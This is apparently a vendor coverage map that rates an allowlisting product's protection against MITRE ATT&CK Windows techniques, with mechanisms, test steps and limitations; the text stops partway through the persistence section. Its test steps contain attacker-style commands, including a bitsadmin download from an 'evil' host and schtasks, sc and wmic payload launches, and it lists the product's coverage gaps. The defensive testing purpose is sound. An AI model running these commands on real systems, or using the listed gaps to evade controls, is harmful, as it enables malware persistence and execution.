# Airlock Digital - MITRE ATT&CK Enterprise Mapping (Windows)

>**Author:** Rob Shiplo - Sr Research Engineer - Systems & Endpoint Security @ Airlock Digital
>
>**Published:** March 2026 | **Platform:** Windows | **ATT&CK Version:** Enterprise v18.1

## Overview

**Total techniques:** 472

**Covered (Yes):** 209 (44%)

**Not Covered (No):** 263 (55%)

## Scoring

**Yes** - Airlock's enforcement model directly controls an execution point in this technique's attack chain. The payload, binary, DLL, script, or driver IS blocked. Here's the mechanism and how to prove it.

**No** - This technique doesn't involve file/script/DLL execution that Airlock controls, and there is no specific binary that can be practically blocklisted to prevent it. Typically network-level, identity-plane, in-memory, or pure API operations. Here's what covers it instead.

## Assumptions

- Windows platform
- Enforcement mode active
- Script control: Enabled, respect policy (all script types)
- DLL/library control: enabled (default)
- Browser extension control: enabled
- Mature policy: appropriate publisher trust, no over-broad path rules

## Coverage by Tactic

| Tactic | Yes | No | Total |
|--------|----:|---:|------:|
| initial-access | 6 | 15 | 21 |
| execution | 23 | 4 | 27 |
| persistence | 67 | 24 | 91 |
| privilege-escalation | 47 | 28 | 75 |
| defense-evasion | 77 | 88 | 165 |
| credential-access | 13 | 40 | 53 |
| discovery | 21 | 21 | 42 |
| lateral-movement | 10 | 7 | 17 |
| collection | 4 | 28 | 32 |
| command-and-control | 6 | 39 | 45 |
| exfiltration | 0 | 17 | 17 |
| impact | 9 | 21 | 30 |

---


## INITIAL-ACCESS (21 techniques - 6 covered)

### T1078 - Valid Accounts
**No** ⚪ | none

Valid accounts. Using legitimate credentials. Identity plane. No file execution.

**Limitations:** Post-access, Airlock enforces on tools attacker runs with valid creds.

### T1078.001 - Default Accounts
**No** ⚪ | none

Default accounts. Identity.

### T1078.002 - Domain Accounts
**No** ⚪ | none

Domain accounts. Identity.

### T1078.003 - Local Accounts
**No** ⚪ | none

Local accounts. Identity.

### T1091 - Replication Through Removable Media
**Yes** 🟢 | default-deny + script-control | Testable: yes

Replication through removable media. Malware on USB must be trusted to execute. Autorun payloads blocked.

**Test:** Insert USB with unsigned exe, attempt to run -> blocked. Autorun pointing to untrusted payload -> blocked.

**Limitations:** USB device insertion not prevented. Only execution of untrusted files.

### T1133 - External Remote Services
**No** ⚪ | none (post-access execution controlled) | Testable: partial

External remote services (VPN/RDP/Citrix). Access mechanism. Post-access, Airlock enforces on any tools attacker tries to run.

**Test:** RDP in, attempt unsigned tool -> blocked.

**Limitations:** Access itself not prevented.

### T1189 - Drive-by Compromise
**Yes** 🟢 | default-deny + DLL-control | Testable: partial

Drive-by compromise - browser exploit in trusted browser. Any payload dropped to disk (exe/DLL/script) must be trusted.

**Test:** Drive-by drops exe -> blocked. Drive-by drops DLL -> blocked.

**Limitations:** In-browser exploitation executing entirely in memory not caught.

### T1190 - Exploit Public-Facing Application
**No** ⚪ | none

Exploiting a public-facing application is a network/application security problem. Airlock doesn't prevent exploits. WAF, patching, network segmentation are the controls. Post-exploitation payload execution on the host is covered under execution techniques.

**Limitations:** Web application firewalls, patching, and network segmentation are the primary controls.

### T1195 - Supply Chain Compromise
**No** ⚪ | default-deny | Testable: partial

Supply chain compromise with valid publisher signatures. If compromised software is signed by a publisher trusted in Airlock policy, it passes. Unsigned/differently-signed supply chain payloads blocked.

**Test:** Unsigned supply chain payload -> blocked. Signed by compromised-but-trusted publisher -> allowed.

**Limitations:** Publisher trust is the gap. Hash-based trust is more granular. This is a fundamental supply chain risk for any trust model.

### T1195.001 - Compromise Software Dependencies and Development Tools
**No** ⚪ | DLL-control + default-deny | Testable: partial

Same principle as parent. Compromised dependency signed by trusted publisher passes.

**Test:** Untrusted dependency DLL -> blocked.

**Limitations:** Signed by trusted publisher -> passes.

### T1195.002 - Compromise Software Supply Chain
**No** ⚪ | default-deny | Testable: partial

Same. Compromised software update with valid signature passes publisher trust.

**Test:** Unsigned update -> blocked.

### T1195.003 - Compromise Hardware Supply Chain
**No** ⚪ | none

Compromise hardware supply chain. Physical hardware. Below software layer.

**Limitations:** Hardware security.

### T1199 - Trusted Relationship
**No** ⚪ | none | Testable: partial

Trusted relationship. Third-party access. Access mechanism, not file execution. Post-access Airlock enforces.

**Test:** Third party RDPs in, runs unsigned tool -> blocked.

**Limitations:** Access not prevented.

### T1200 - Hardware Additions
**No** ⚪ | default-deny (for payloads) | Testable: partial

Hardware additions. Physical device. If device delivers malware, execution blocked. Device insertion not prevented.

**Test:** Rogue USB device drops malware -> malware blocked.

**Limitations:** Physical access/device insertion not Airlock scope.

### T1566 - Phishing
**Yes** 🟢 | default-deny + script-control | Testable: yes

Phishing delivery not prevented. Payload execution blocked. This is the handoff: email security handles delivery, Airlock handles execution.

**Test:** User opens phishing email, runs attached payload -> blocked.

**Limitations:** Phishing delivery, social engineering, credential harvesting not in scope.

### T1566.001 - Spearphishing Attachment
**Yes** 🟢 | default-deny + script-control | Testable: yes

Spearphishing attachment. Attachment (exe/script/msi) must be trusted. Macro-enabled docs: doc opens, payload blocked.

**Test:** 1) .exe attachment -> blocked. 2) .js/.vbs attachment -> blocked via script control. 3) Macro doc drops exe -> exe blocked.

**Limitations:** Doc itself opens. Macro code runs inside Office.

### T1566.002 - Spearphishing Link
**Yes** 🟢 | default-deny | Testable: yes

Spearphishing link. Downloaded payload must be trusted to execute.

**Test:** Click link, download exe, run -> blocked.

**Limitations:** Link clicking and credential phishing pages not prevented.

### T1566.003 - Spearphishing via Service
**Yes** 🟢 | default-deny | Testable: yes

Payload delivered via messaging service. Must be trusted to execute.

**Test:** Payload from Slack/Teams/LinkedIn -> blocked at execution.

**Limitations:** Delivery not prevented.

### T1566.004 - Spearphishing Voice
**No** ⚪ | none

Spearphishing voice (vishing). Social engineering via phone. No file execution involved directly.

**Limitations:** If vishing leads to user running something, that execution is checked.

### T1659 - Content Injection
**No** ⚪ | none

Content injection. Injecting content into network traffic. Network-level.

**Limitations:** If injected content leads to file download+execution, execution blocked.

### T1669 - Wi-Fi Networks
**No** ⚪ | none

Wi-Fi networks. Rogue Wi-Fi. Network-level. No file execution.

**Limitations:** Network security.


## EXECUTION (27 techniques - 23 covered)

### T1047 - Windows Management Instrumentation
**Yes** 🟢 | default-deny + blocklist | Testable: yes

WMI tools (wmic.exe, wmiprvse.exe) typically trusted. Any payload WMI launches must pass default-deny - untrusted exe/script/DLL blocked at execution. wmic.exe itself can be blocklisted per user/group via metarules.

**Test:** wmic process call create C:\Temp\unsigned.exe -> exe blocked at execution. Blocklist wmic.exe for non-admins via metarule.

**Limitations:** Inline WMI commands (process call create 'cmd /c whoami') run inside trusted interpreter - not inspected. WMI event subscriptions: payload still checked at execution.

### T1053 - Scheduled Task/Job
**Yes** 🟢 | default-deny | Testable: yes

Task scheduling tools are trusted OS utilities. Task creation not blocked. Payload blocked when task fires if untrusted.

**Test:** schtasks /create /tn test /tr C:\Temp\payload.exe /sc once /st 12:00 -> creates OK. When task fires, payload.exe blocked.

**Limitations:** Task creation succeeds. Trusted-signed payloads run.

### T1053.002 - At
**Yes** 🟢 | default-deny + blocklist | Testable: yes

at utility schedules tasks. at.exe can be blocklisted. Payload blocked at execution time.

**Test:** at 12:00 C:\Temp\malware.exe -> job creates, exe blocked at scheduled time.

**Limitations:** Job creation not prevented.

### T1053.005 - Scheduled Task
**Yes** 🟢 | default-deny + blocklist | Testable: yes

Windows Task Scheduler. schtasks.exe trusted. Payload must be trusted when task fires. schtasks.exe restrictable via blocklist metarules.

**Test:** schtasks /create /tn evil /tr C:\Temp\payload.exe -> OK. On fire, payload blocked.

**Limitations:** Task creation not prevented. PS one-liners via -Command not caught if PS trusted.

### T1059 - Command and Scripting Interpreter
**Yes** 🟢 | script-control + default-deny + blocklist + DLL-control | Testable: yes

Script control enforces allowlisting on all configured script types (PS, batch, cmd, Python, JS, VBS, MSI, etc). Every script SHA-256 hashed at execution. Interpreters controllable via allowlist/blocklist metarules. DLL control catches malicious modules loaded by interpreters.

**Test:** Drop untrusted .ps1/.bat/.vbs/.py, execute -> blocked. Blocklist PS for non-admins via metarule (original filename contains powershell AND user not admin).

**Limitations:** Interactive/inline commands in trusted interpreter not intercepted. Script control must be enabled.

### T1059.001 - PowerShell
**Yes** 🟢 | script-control + blocklist-metarule | Testable: yes

Script control blocks untrusted .ps1/.psm1/.psd1. powershell.exe blocklisted for non-admins via metarule (explicitly demonstrated in Airlock blocklist docs). PS -EncodedCommand/-Command inline not inspected.

**Test:** 1) Drop unsigned .ps1, invoke -> blocked. 2) Metarule: original_filename contains 'powershell' AND user NOT admin -> PS blocked for std users. 3) PS -Command 'whoami' -> runs if PS trusted. 4) PS -EncodedCommand <b64> -> runs if PS trusted.

**Limitations:** Inline/encoded commands in trusted PS not caught. AMSI bypass, download cradles in-memory not Airlock scope.

### T1059.003 - Windows Command Shell
**Yes** 🟢 | script-control + blocklist-metarule | Testable: yes

Batch/cmd files (.bat/.cmd) enforced under script control. cmd.exe blocklist-restrictable. Child processes spawned by cmd still checked.

**Test:** 1) Drop .bat, execute -> blocked. 2) cmd /c dir -> runs (inline). 3) cmd /c C:\Temp\malware.exe -> cmd OK, malware.exe blocked. 4) Blocklist cmd for non-admins.

**Limitations:** Inline commands not inspected. Child process launches ARE checked.

### T1059.005 - Visual Basic
**Yes** 🟢 | script-control + blocklist | Testable: yes

VBScript (.vbs/.vbe) blocked via script control. cscript/wscript/mshta blocklist-controllable. VBA macros inside Office: doc opens (Office trusted), dropped payloads blocked.

**Test:** 1) .vbs double-click -> blocked. 2) Blocklist wscript/cscript entirely. 3) Macro drops exe -> exe blocked.

**Limitations:** VBA macro code inside trusted Office not inspected.

### T1059.006 - Python
**Yes** 🟢 | script-control + default-deny + DLL-control | Testable: yes

python.exe must be allowlisted. .py files enforced via script control. .pyd as DLL control. Most endpoints don't need Python.

**Test:** 1) python.exe not allowlisted -> blocked. 2) Trusted python.exe, untrusted .py -> blocked. 3) python -c 'print(1)' -> runs if trusted (inline).

**Limitations:** Interactive REPL/inline not inspected.

### T1059.007 - JavaScript
**Yes** 🟢 | script-control + blocklist + default-deny | Testable: yes

JS files (.js/.jse) via WSH blocked by script control. node.exe must be allowlisted. mshta.exe blocklist-controllable. Browser JS not in scope.

**Test:** 1) .js double-click -> blocked. 2) Blocklist mshta.exe. 3) node.exe not allowlisted -> blocked.

**Limitations:** Browser JS runs inside trusted browser process.

### T1059.010 - AutoHotKey & AutoIT
**Yes** 🟢 | default-deny | Testable: yes

AutoHotKey/AutoIT interpreters must be allowlisted (typically not in enterprise). Compiled AHK/AutoIT .exe caught by default-deny.

**Test:** 1) AutoIt3.exe not allowlisted -> blocked. 2) Compiled AutoIT dropper -> blocked.

**Limitations:** If interpreter is allowlisted, scripts need coverage.

### T1059.011 - Lua
**Yes** 🟢 | default-deny | Testable: yes

lua.exe/luajit must be allowlisted. Not present in typical enterprise. Embedded Lua in trusted apps not in scope.

**Test:** lua.exe dropped -> blocked (not in allowlist).

**Limitations:** Embedded Lua in trusted processes runs in-process.

### T1072 - Software Deployment Tools
**Yes** 🟢 | default-deny | Testable: partial

Deployment tools (SCCM, PDQ) are trusted. If compromised to push malicious payloads, payload must still pass default-deny on target endpoint. Untrusted binary blocked at execution regardless of delivery method.

**Test:** Push unsigned exe via SCCM to endpoint -> deployed successfully, blocked at execution.

**Limitations:** If deployment tool configured as trusted parent process, audit process trust rules carefully. Payloads signed by trusted publisher pass publisher trust.

### T1106 - Native API
**No** ⚪ | none

Native API calls (NtCreateProcess, VirtualAllocEx, CreateRemoteThread) operate inside trusted processes. Airlock doesn't hook APIs. If API call loads new DLL/exe, that IS checked.

**Test:** N/A - API-level behavior inside trusted processes.

**Limitations:** By design. EDR territory.

### T1129 - Shared Modules
**Yes** 🟢 | DLL-control | Testable: yes

Airlock allowlists DLLs by default. Every DLL load SHA-256 hashed and checked. Prevents DLL sideloading.

**Test:** 1) Place unsigned DLL in trusted app directory (sideload) -> blocked. 2) LoadLibrary('C:\Temp\evil.dll') -> blocked.

**Limitations:** Reflective DLL injection (memory-only, never a file) not caught.

### T1203 - Exploitation for Client Execution
**No** ⚪ | default-deny + DLL-control | Testable: partial

Exploitation for client execution is about abusing a vulnerability in a trusted application. The exploit runs inside the trusted process. Airlock doesn't detect or prevent the exploit itself. Post-exploitation payload execution is covered under the relevant execution techniques.

**Limitations:** Exploit prevention, patching, and EDR behavioral detection are the controls.

### T1204 - User Execution
**Yes** 🟢 | default-deny + script-control + DLL-control | Testable: yes

Core Airlock value. User double-clicks malicious file -> blocked by default-deny. Covers exe, script, installer, DLL.

**Test:** Copy unsigned exe/msi/script to desktop, double-click -> blocked.

**Limitations:** Social engineering itself not prevented.

### T1204.001 - Malicious Link
**Yes** 🟢 | default-deny | Testable: yes

Malicious link leads to file download. Downloaded payload must be trusted to execute. Airlock blocks the execution regardless of how the file was obtained.

**Test:** Click link -> download unsigned exe -> attempt to run -> blocked.

**Limitations:** Link clicking itself not prevented. Browser-only attacks (credential phishing pages) not in scope - that's web filtering/proxy.

### T1204.002 - Malicious File
**Yes** 🟢 | default-deny + script-control + DLL-control | Testable: yes

Direct hit. Malicious file opened by user -> blocked. Covers email attachments, USB, downloads. MSI via script control. Macro-enabled docs: doc opens, dropped payload blocked.

**Test:** 1) Unsigned exe from email -> blocked. 2) Malicious .msi -> blocked. 3) Macro doc drops exe -> exe blocked.

**Limitations:** Doc opens in trusted Office. Macro code runs inside Office.

### T1204.004 - Malicious Copy and Paste
**Yes** 🟢 | default-deny + blocklist | Testable: yes

Pasted commands run inside trusted interpreter (not inspected). But any untrusted payload the pasted command tries to execute IS blocked. Blocklisting interpreters for non-admins prevents the paste target entirely.

**Test:** 1) Paste download cradle into PS -> download succeeds, dropped exe blocked. 2) Blocklist PS for non-admins -> user can't open interpreter to paste into.

**Limitations:** Inline commands in trusted interpreter not inspected. Blocking the interpreter is the strongest control.

### T1204.005 - Malicious Library
**Yes** 🟢 | DLL-control | Testable: yes

DLL/library control blocks untrusted native libraries at load time. npm/pip packages with malicious native extensions blocked.

**Test:** npm install with malicious native addon (.dll) -> blocked.

**Limitations:** Pure interpreted library code needs script control.

### T1559 - Inter-Process Communication
**No** ⚪ | none

IPC mechanisms (COM, DDE, pipes) between trusted processes not monitored. New file loads from IPC ARE checked.

**Test:** N/A - IPC between trusted processes outside scope.

**Limitations:** New DLL/exe loads from IPC are checked.

### T1559.001 - Component Object Model
**Yes** 🟢 | DLL-control | Testable: yes

COM server DLLs must be trusted to load. When a COM object is instantiated, the DLL it points to is checked by DLL control. Untrusted COM DLL blocked at load time. This is the primary defense against COM abuse for execution.

**Test:** Register COM object pointing to unsigned DLL via registry -> DLL blocked when COM object instantiated by any process.

**Limitations:** COM automation between already-trusted processes using trusted DLLs is not monitored. Registry modification to register the COM object is not prevented.

### T1559.002 - Dynamic Data Exchange
**Yes** 🟢 | default-deny + blocklist | Testable: yes

DDE in Office launches processes. Any process/payload launched via DDE must be trusted. Untrusted payload blocked.

**Test:** DDE in Word launching cmd /c C:\Temp\payload.exe -> cmd runs (trusted), payload.exe blocked.

**Limitations:** DDE data exchange between trusted apps not monitored.

### T1569 - System Services
**Yes** 🟢 | default-deny | Testable: yes

Service binary must be trusted. Service creation may succeed but untrusted binary blocked at start. sc.exe cannot be practically blocklisted but the binary execution is the control point.

**Test:** sc create evilsvc binPath= C:\Temp\malware.exe -> OK. sc start -> binary blocked.

**Limitations:** Service creation not prevented. sc.exe cannot be practically blocklisted.

### T1569.002 - Service Execution
**Yes** 🟢 | default-deny + blocklist (predefined) | Testable: yes

PsExec creates PSEXESVC.exe on target. Must be trusted. PsExec in Microsoft Recommended Block Rules predefined blocklist. Blocklist overrides allowlist.

**Test:** 1) PsExec to target -> PSEXESVC.exe blocked. 2) Import MS Block Rules -> PsExec blocked even with MS trust.

**Limitations:** If PSEXESVC explicitly allowlisted, it runs.

### T1674 - Input Injection
**No** ⚪ | none

Input injection (SendInput, keystrokes) is UI-level. Airlock doesn't monitor input. Resulting file launches checked.

**Test:** N/A - input simulation outside scope.

**Limitations:** Resulting binary execution still checked.


## PERSISTENCE (91 techniques - 67 covered)

### T1037 - Boot or Logon Initialization Scripts
**Yes** 🟢 | script-control + default-deny | Testable: yes

Boot/logon init scripts. Script content must be trusted via script control. Untrusted scripts blocked at logon.

**Test:** Set GPO logon script to untrusted .bat -> blocked at logon.

**Limitations:** Script path configuration not prevented.

### T1037.001 - Logon Script (Windows)
**Yes** 🟢 | script-control + default-deny | Testable: yes

Logon scripts (Windows). Script file must be trusted. Scripts in NETLOGON share: if path-trusted, runs.

**Test:** Place untrusted .bat in NETLOGON, assign via GPO -> blocked on target at logon.

**Limitations:** Legitimate scripts in trusted paths run. Replacing trusted script at same path could work if path-trusted.

### T1037.003 - Network Logon Script
**Yes** 🟢 | script-control + default-deny | Testable: yes

Network logon script. Same principle as T1037.001 but via network logon.

**Test:** Untrusted network logon script -> blocked.

**Limitations:** Same path trust caveats.

### T1053 - Scheduled Task/Job
**Yes** 🟢 | default-deny | Testable: yes

Task scheduling tools are trusted OS utilities. Task creation not blocked. Payload blocked when task fires if untrusted.

**Test:** schtasks /create /tn test /tr C:\Temp\payload.exe /sc once /st 12:00 -> creates OK. When task fires, payload.exe blocked.

**Limitations:** Task creation succeeds. Trusted-signed payloads run.

### T1053.002 - At
**Yes** 🟢 | default-deny + blocklist | Testable: yes

at utility schedules tasks. at.exe can be blocklisted. Payload blocked at execution time.

**Test:** at 12:00 C:\Temp\malware.exe -> job creates, exe blocked at scheduled time.

**Limitations:** Job creation not prevented.

### T1053.005 - Scheduled Task
**Yes** 🟢 | default-deny + blocklist | Testable: yes

Windows Task Scheduler. schtasks.exe trusted. Payload must be trusted when task fires. schtasks.exe restrictable via blocklist metarules.

**Test:** schtasks /create /tn evil /tr C:\Temp\payload.exe -> OK. On fire, payload blocked.

**Limitations:** Task creation not prevented. PS one-liners via -Command not caught if PS trusted.

### T1078 - Valid Accounts
**No** ⚪ | none

Valid accounts. Using legitimate credentials. Identity plane. No file execution.

**Limitations:** Post-access, Airlock enforces on tools attacker runs with valid creds.

### T1078.001 - Default Accounts
**No** ⚪ | none

Default accounts. Identity.

### T1078.002 - Domain Accounts
**No** ⚪ | none

Domain accounts. Identity.

### T1078.003 - Local Accounts
**No** ⚪ | none

Local accounts. Identity.

### T1098 - Account Manipulation
**No** ⚪ | none

Account manipulation. Identity-plane operation. No file execution.

**Limitations:** Identity/directory security.

### T1098.002 - Additional Email Delegate Permissions
**No** ⚪ | none

Additional email delegate permissions. No file execution.

### T1098.005 - Device Registration
**No** ⚪ | none

Device registration. MDM/identity plane.

### T1098.007 - Additional Local or Domain Groups
**No** ⚪ | none

Adding users to groups is an identity operation. net.exe is used by standard users for drive mapping and other legitimate operations - blocklisting it causes operational issues. PowerShell AD cmdlets and direct LDAP/API calls can perform the same operation.

### T1112 - Modify Registry
**No** ⚪ | none

Registry modification is a data operation. Airlock doesn't monitor registry writes. reg.exe and regedit.exe are used by installers, Group Policy processing, and Windows Update - blocklisting them is impractical without breaking system operations. PowerShell, WMI, and direct registry APIs from any trusted process can modify the registry. Many persistence techniques USE registry for setup, but Airlock catches the PAYLOAD those registry entries point to, not the registry modification itself.

**Limitations:** Registry monitoring is outside Airlock scope. Registry-based persistence is caught at payload execution time, not at registration time.

### T1133 - External Remote Services
**No** ⚪ | none (post-access execution controlled) | Testable: partial

External remote services (VPN/RDP/Citrix). Access mechanism. Post-access, Airlock enforces on any tools attacker tries to run.

**Test:** RDP in, attempt unsigned tool -> blocked.

**Limitations:** Access itself not prevented.

### T1136 - Create Account
**No** ⚪ | none

Account creation via net user /add. Identity operation. net.exe cannot be practically blocklisted. PowerShell New-LocalUser/New-ADUser available.

### T1136.001 - Local Account
**No** ⚪ | none

Local account creation via net user /add. Same as parent.

### T1136.002 - Domain Account
**No** ⚪ | none

Domain account. Identity operation.

### T1137 - Office Application Startup
**Yes** 🟢 | DLL-control + default-deny | Testable: yes

Office application startup. Malicious add-ins (DLLs) must be trusted. Template macros: doc opens, payload blocked.

**Test:** 1) Untrusted Office add-in DLL -> blocked at Office startup. 2) Malicious .dotm macro drops exe -> exe blocked.

**Limitations:** Macro code inside trusted Office not inspected.

### T1137.001 - Office Template Macros
**Yes** 🟢 | default-deny + DLL-control | Testable: yes

Office template macros. Template loads in trusted Office. Macro code runs. Dropped payloads blocked.

**Test:** Malicious .dotm macro drops exe -> exe blocked.

**Limitations:** Macro code itself runs inside Office.

### T1137.002 - Office Test
**Yes** 🟢 | DLL-control | Testable: yes

Office Test reg key loads DLL into Office. DLL must be trusted.

**Test:** Set Office Test reg key to unsigned DLL -> DLL blocked at Office launch.

**Limitations:** Reg mod not prevented.

### T1137.003 - Outlook Forms
**Yes** 🟢 | DLL-control + default-deny | Testable: partial

Outlook forms loading DLLs - DLL must be trusted.

**Test:** Outlook form loading untrusted DLL -> blocked.

**Limitations:** VBScript running inside trusted Outlook form context may execute. Dropped payloads blocked.

### T1137.004 - Outlook Home Page
**Yes** 🟢 | default-deny | Testable: partial

Outlook home page triggering external process execution - process must be trusted.

**Test:** Outlook home page launching untrusted exe -> blocked.

**Limitations:** HTML/script running inside Outlook's embedded browser context may not be caught.

### T1137.005 - Outlook Rules
**Yes** 🟢 | default-deny | Testable: yes

Outlook rules can run applications. Application must be trusted.

**Test:** Outlook rule to run C:\Temp\payload.exe -> blocked.

**Limitations:** Rule creation not prevented.

### T1137.006 - Add-ins
**Yes** 🟢 | DLL-control | Testable: yes

Office add-ins (.dll/.xll). Must be trusted by hash/publisher.

**Test:** Untrusted .xll in add-in dir -> blocked by Excel.

**Limitations:** Signed add-ins from trusted publishers load normally.

### T1176 - Software Extensions
**Yes** 🟢 | browser-extension-control | Testable: yes

Browser extensions. Dedicated browser extension control feature. Untrusted extensions blocked from installation on Chrome/Edge/Firefox. Extension updates monitored.

**Test:** 1) Enable browser ext control in enforcement. 2) Install untrusted extension -> fails. 3) Untrusted extension update -> browser uninstalls it.

**Limitations:** Only controls extension installation, not JS within trusted extensions.

### T1176.001 - Browser Extensions
**Yes** 🟢 | browser-extension-control | Testable: yes

Browser extensions specifically. Same as parent.

**Test:** Same as T1176.

**Limitations:** Same.

### T1176.002 - IDE Extensions
**Yes** 🟢 | default-deny + DLL-control | Testable: partial

IDE must be allowlisted. IDE extension DLLs/native modules must be trusted.

**Test:** Untrusted VS Code extension native module -> blocked at load.

**Limitations:** JS-based extensions run inside trusted IDE process - not separately controlled.

### T1197 - BITS Jobs
**Yes** 🟢 | default-deny + blocklist | Testable: yes

BITS downloads files to disk. Downloaded file must be trusted to execute. bitsadmin.exe can be blocklisted to prevent BITS job creation.

**Test:** bitsadmin /transfer job /download http://evil/payload.exe C:\Temp\p.exe -> downloads OK, execution blocked. Blocklist bitsadmin for non-admins.

**Limitations:** Download itself not prevented - only execution of downloaded payload.

### T1205 - Traffic Signaling
**No** ⚪ | none

Traffic signaling / port knocking. Network-level. No file execution.

**Limitations:** Network security.

### T1205.001 - Port Knocking
**No** ⚪ | none

Port knocking. Network-level.

### T1205.002 - Socket Filters
**No** ⚪ | none

Socket filters. Kernel-level network manipulation.

### T1505 - Server Software Component
**Yes** 🟢 | script-control + DLL-control | Testable: yes

Web shell scripts (.aspx/.asp/.php) blocked by script control if file type is configured. Compiled DLL components blocked by DLL control. Airlock deploys to servers - web shells and malicious IIS/Exchange components are directly controlled.

**Test:** Upload untrusted .aspx web shell -> blocked by script control. Untrusted IIS module DLL -> blocked.

**Limitations:** Script control must cover the relevant web script file types.

### T1505.001 - SQL Stored Procedures
**No** ⚪ | none

SQL stored procedures. Inside trusted SQL Server. No file execution.

**Limitations:** xp_cmdshell spawning processes -> those processes checked.

### T1505.002 - Transport Agent
**Yes** 🟢 | DLL-control | Testable: yes

Transport agent. Exchange transport agent DLL. Must be trusted.

**Test:** Untrusted transport agent DLL -> blocked at load.

**Limitations:** Exchange-specific.

### T1505.003 - Web Shell
**Yes** 🟢 | script-control + DLL-control | Testable: partial

Web shells. Script files deployed to web server. If type covered by script control, blocked. Compiled DLLs blocked.

**Test:** Upload untrusted .aspx with script control -> blocked.

**Limitations:** Requires script control for web script types.

### T1505.004 - IIS Components
**Yes** 🟢 | DLL-control | Testable: yes

IIS native modules (DLL). Must be trusted.

**Test:** Install untrusted IIS module DLL -> blocked.

**Limitations:** Module registration not prevented.

### T1505.005 - Terminal Services DLL
**Yes** 🟢 | DLL-control | Testable: yes

Terminal services DLL. Must be trusted to load.

**Test:** Untrusted terminal services DLL -> blocked.

### T1542 - Pre-OS Boot
**No** ⚪ | none

Pre-OS boot. Firmware/bootkit operates below OS. Airlock kernel driver loads after OS boot.

**Test:** N/A - below OS level.

**Limitations:** Secure Boot is the control here.

### T1542.001 - System Firmware
**No** ⚪ | none

System firmware. Below OS.

**Limitations:** UEFI security.

### T1542.002 - Component Firmware
**No** ⚪ | none

Component firmware. Below OS.

**Limitations:** Hardware security.

### T1542.003 - Bootkit
**No** ⚪ | none

Bootkit. Below OS level.

**Limitations:** Secure Boot/ELAM territory.

### T1543 - Create or Modify System Process
**Yes** 🟢 | default-deny | Testable: yes

Service creation succeeds (sc create not prevented - sc.exe cannot be practically blocklisted). Service binary blocked at start if untrusted. This is the primary control - the attacker can register the service but the untrusted payload cannot execute.

**Test:** sc create evilsvc binPath= C:\Temp\evil.exe -> creation OK. sc start evilsvc -> binary blocked (untrusted).

**Limitations:** Service creation not prevented. sc.exe cannot be practically blocklisted. Airlock controls the execution of the service binary, not the service configuration.

### T1543.003 - Windows Service
**Yes** 🟢 | default-deny + DLL-control | Testable: yes

Windows Service binary/DLL must be trusted. Service DLLs loaded via svchost blocked by DLL control. sc.exe cannot be practically blocklisted but the service binary is the control point.

**Test:** 1) sc create with unsigned exe -> start blocked. 2) Malicious svchost service DLL -> blocked by DLL control.

**Limitations:** Service creation not prevented. sc.exe cannot be practically blocklisted.

### T1546 - Event Triggered Execution
**Yes** 🟢 | default-deny + script-control + DLL-control | Testable: yes

Event triggered execution (parent). Code launched by event triggers must be trusted.

**Test:** Varies by sub-technique. Trigger registers OK, payload blocked.

### T1546.001 - Change Default File Association
**Yes** 🟢 | default-deny | Testable: yes

Change default file association. Handler exe must be trusted.

**Test:** assoc .txt to evil handler exe -> exe blocked when .txt opened.

**Limitations:** Reg mod not prevented.

### T1546.002 - Screensaver
**Yes** 🟢 | default-deny | Testable: yes

Screensaver .scr (PE executable). Must be trusted.

**Test:** Set screensaver to untrusted .scr -> blocked on activation.

**Limitations:** .scr files are PE executables, full allowlist enforcement.

### T1546.003 - Windows Management Instrumentation Event Subscription
**Yes** 🟢 | default-deny + script-control | Testable: yes

WMI event subscription. Payload launched by wmiprvse must be trusted. Script payloads via script control.

**Test:** WMI event sub launching unsigned exe -> blocked when event fires.

**Limitations:** Subscription creation not prevented.

### T1546.007 - Netsh Helper DLL
**Yes** 🟢 | DLL-control | Testable: yes

Netsh helper DLL. Must be trusted to load.

**Test:** netsh add helper unsigned.dll -> blocked at load.

**Limitations:** netsh.exe trusted; DLL registration succeeds, load blocked.

### T1546.008 - Accessibility Features
**Yes** 🟢 | default-deny | Testable: yes

Accessibility features (sethc.exe, utilman.exe). Replacement binary must be trusted by hash. Blocklist metarule on original_filename catches renamed trusted tools (e.g., cmd.exe renamed to sethc.exe).

**Test:** Replace sethc.exe with untrusted binary -> blocked at lock screen activation. Blocklist original_filename 'cmd' -> catches cmd.exe renamed to sethc.exe.

**Limitations:** If attacker copies a trusted binary with matching hash, it runs. Original filename metarule is the defense against renamed trusted tools.

### T1546.009 - AppCert DLLs
**Yes** 🟢 | DLL-control | Testable: yes

AppCert DLLs. Loaded into every CreateProcess caller. Must be trusted.

**Test:** Register untrusted AppCert DLL -> blocked at load.

**Limitations:** Reg mod not prevented.

### T1546.010 - AppInit DLLs
**Yes** 🟢 | DLL-control | Testable: yes

AppInit DLLs. Loaded into user-mode processes. Must be trusted.

**Test:** Register untrusted AppInit DLL -> blocked.

**Limitations:** Disabled by default with Secure Boot.

### T1546.011 - Application Shimming
**Yes** 🟢 | DLL-control + blocklist | Testable: yes

Application shimming. sdbinst.exe can be blocklisted. Shim-loaded DLLs must be trusted.

**Test:** 1) Blocklist sdbinst.exe. 2) Shim loading untrusted DLL -> blocked.

**Limitations:** If shim redirects to trusted binary, not inspected.

### T1546.012 - Image File Execution Options Injection
**Yes** 🟢 | default-deny | Testable: yes

IFEO debugger. Debugger binary must be trusted.

**Test:** IFEO debugger set to unsigned exe -> blocked when target launched.

**Limitations:** Reg mod not prevented. Trusted debugger (cmd.exe) runs.

### T1546.013 - PowerShell Profile
**Yes** 🟢 | script-control | Testable: yes

PowerShell profile. profile.ps1 must be trusted via script control.

**Test:** Drop malicious profile.ps1 -> blocked at PS startup if untrusted.

**Limitations:** If profile is path-trusted, runs. Audit path rules.

### T1546.015 - Component Object Model Hijacking
**Yes** 🟢 | DLL-control | Testable: yes

COM hijacking. Malicious DLL registered as COM object. Must be trusted.

**Test:** Untrusted DLL as COM object -> blocked when instantiated.

**Limitations:** Reg mod not prevented.

### T1546.016 - Installer Packages
**Yes** 🟢 | script-control | Testable: yes

Installer packages (MSI). Blocked via script control (MSI is covered type).

**Test:** Drop untrusted .msi -> blocked.

**Limitations:** Trusted-signed MSIs from trusted publishers install normally.

### T1546.018 - Python Startup Hooks
**Yes** 🟢 | script-control + default-deny | Testable: yes

Python startup hooks. Python interpreter must be allowlisted. Startup hook .py must be trusted via script control.

**Test:** 1) python.exe not allowlisted -> blocked. 2) Untrusted startup .py -> blocked.

**Limitations:** If python trusted and hook in trusted path, runs.

### T1547 - Boot or Logon Autostart Execution
**Yes** 🟢 | default-deny + DLL-control | Testable: yes

